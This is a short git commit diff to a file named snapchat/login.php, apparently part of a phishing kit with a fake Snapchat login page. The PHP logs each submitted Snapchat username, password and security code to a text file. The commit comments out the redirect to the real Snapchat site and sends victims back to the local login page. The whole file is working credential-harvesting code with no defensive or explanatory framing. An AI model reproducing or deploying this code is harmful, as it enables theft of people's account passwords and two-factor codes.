ac701fcacfc709392781ce13adfb4e84b3a1a6f1
Maxhem2 <genemaxd@gmail.com>
2024-03-20 16:41:23 +0100

    asd

--- .sites/snapchat/login.php
+++ .sites/snapchat/login.php
@@ -1,6 +1,7 @@
 <?php
 
 file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " Security Code: " . $_POST['security_code'] . "\n", FILE_APPEND);
-header('Location: https://web.snapchat.com');
+# header('Location: https://web.snapchat.com'); 
+header('Location: login.html'); 
 exit();
 ?>
